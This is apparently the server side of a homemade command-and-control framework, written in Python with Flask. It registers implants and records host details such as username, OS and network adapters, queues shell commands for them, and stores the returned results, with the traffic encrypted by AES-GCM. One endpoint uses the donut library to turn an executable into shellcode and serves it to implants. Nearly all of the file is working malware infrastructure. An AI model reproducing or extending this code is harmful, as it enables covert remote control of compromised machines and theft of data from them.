"""
    This file stores all the functions that are used to interact with the agent from the server
"""

from c2_config import *
from c2_database import *
from aesgcm import *
import donut


@login_manager.user_loader
def load_user(user_id):
    """
       a required function for flask-login
    """
    return Agent.query.get(user_id)

@app.route('/agent/register', methods=["POST"]) # support only POST requests
def register_agent(): # --> this is a handler
    """
        listens to the /register_agent route
        and processes the registration request from agents
    """
    # request.json -> this will be how we are getting data from implant
    reg_data = decrypt_data(request.data)  # storing registration data
    if reg_data == None:
        return jsonify({"status": "no data"})

    reg_password  = reg_data["password"]
    reg_whoami    = reg_data["whoami"]
    reg_agent_id  = reg_data["agent_id"]
    reg_username  = reg_data["username"]
    reg_cpus      = reg_data["cpus"]
    reg_osVersion = reg_data["osVersion"]
    reg_adaptors  = reg_data["adaptors"]

    if reg_agent_id == None or reg_password == None:
        return encrypt_data({"status": "failed to get data from implant"})
    

    if verify_agent_password(reg_password):
        if agent_exist(reg_agent_id):
            agent = find_agent_by_id(reg_agent_id)
            agent.authenticated = True
            login_user(agent)
            print(f"[+] agent {agent.agent_id} has been authenticated")
        else:
            agent = Agent(agent_id=reg_agent_id, username=reg_username, computer_name=reg_whoami, cpus=reg_cpus, osVersion=reg_osVersion, adaptors=reg_adaptors)
            db.session.add(agent)
            db.session.commit() ## saves the data to the database
            agent.authenticated = True
            login_user(agent)
            print(f"[+] agent {agent.agent_id} has been successfully registered")

        return encrypt_data({"status": "ok", "message": "Welcome!"})
    else: ## password authentication failed
        print("[-] authentication failed")
        return encrypt_data({"status": "failed", "message": "Authentication failed"})

        
   # if not agent_exist(reg_agent_id): ## if agent does not exist already
    #     hashed_password, salt = hash_password(reg_password)
    #     agent = Agent(agent_id=reg_agent_id, username=reg_whoami, password=hashed_password, salt=salt)
    #     db.session.add(agent)
    #     db.session.commit() ## saves the data to the database

    # #TODO: need to change this part so that password is properly verified
    # if verify_agent_password(reg_agent_id, reg_password):
    #     print(f"[+] a new agent has successfully registered: {agent.agent_id}, {agent.username}")
    #     agent = find_agent_by_id(reg_agent_id)
    #     agent.authenticated = True
    #     login_user(agent) ## user loader function required from flask-login
    #     print(f"[+] agent {agent.agent_id} has been authenticated")
        
    #     return encrypt_data({"status": "ok", "message": "Welcome!"})
    # else:
    #     # print("[-] authentication failed")
    #     return encrypt_data({"status": "authentication failed"})


@app.route('/agent/get_task', methods=['POST'])
# @login_required => this might only work with redirecting
def get_task():
    """
        listens to the /task route
        When an implant asks for a new task, this function will query the database
        and see if the client has issued any task to that specific agent
        If so, return the task (a list of commands) in a json format
        If not, return an empty json (or something else)
    """
    data = decrypt_data(request.data) ## getting a request from task route
    if data == None:
        return encrypt_data({"status": "no data"})

    agent_id = data["agent_id"] ## need to verify agent_id 
    password = data["password"] ## and password 
    agent = find_agent_by_id(agent_id)
    if not agent_exist(agent_id):
        return encrypt_data({"status": "agent not found"})
    if not verify_agent_password(password):
        return encrypt_data({"status": "agent not authenticated"})
    # if verify_agent_password(agent_id, password):
    print(f"[+] agent {agent_id} has nothing to do. Give it a job!")
    task = find_agent_task(agent_id) ## find the task for the agent if there is any

    # ### A DUMMY CMD FOR TESTING PURPOSES ###
    # task = {"command_type": "test_command", "cmd": ["whoami", "ping 8.8.8.8"], "status": "ok", "job_id"} 
    # ### COMMENT OUT WHEN TASK MUST BE READ FROM DB ###

    if task == None:
        return encrypt_data({"status": "no task"})
    else:
        #TODO: get list of task 
        tasks = list_tasks_CREATED(agent_id) ## only return the tasks whose job_status = CREATED
        tasks_out = []
        for i in tasks:
            #TODO: update job status in db
            temp = {"job_id": i.job_id,
            "command_type": i.command_type, "cmd": i.cmd, "job_results": i.job_results }
            i.job_status = TASKED
            db.session.commit()
            tasks_out.append(temp)
        return encrypt_data({"tasks": tasks_out, "status":"ok"})
        # return encrypt_data({"job_id": task.job_id,"command_type": task.command_type, "cmd": task.cmd, "status": "ok"})

@app.route('/agent/send_results', methods=['POST'])
# @login_required => this might only work with redirecting
def send_results():
    """
        listens to the /task_results route
        When an implant sends back the results of a task, this function will store the results
        in the database
    """
    data = decrypt_data(request.data)
    if data == None:
        return encrypt_data({"status": "no data"})
    agent_id = data["agent_id"]
    password = data["password"]
    results = data["results"]
    job_id = data["job_id"]
    agent = find_agent_by_id(agent_id)

    if not agent_exist(agent_id):
        return encrypt_data({"status": "agent not found"})
    if not verify_agent_password(password):
        return encrypt_data({"status": "agent not authenticated"})

    print(f"[+] agent {agent_id} has successfully completed the task# {job_id}")
    print(f"[+] here are the results: {results}")
    # agent = find_agent_by_id(agent_id)
    task = find_task_by_jobID(job_id)
    if task == None:
        return encrypt_data({"status": "task not found"})
    task.job_results = results
    task.job_status = DONE
    db.session.commit()
    return encrypt_data({"status": "ok"})

@app.route('/agent/get_shellcode', methods=['GET'])
def get_shellcode():
    # data = decrypt_data(request.data)
    # if data == None:
    #     return encrypt_data({"status": "no data"})
    # shellcode = donut.create(file="test.dll", method="IAmAGoodNoodle")
    # print(shellcode)
    shellcode = donut.create(file="troll.exe")
    return encrypt_shellcode(shellcode)

    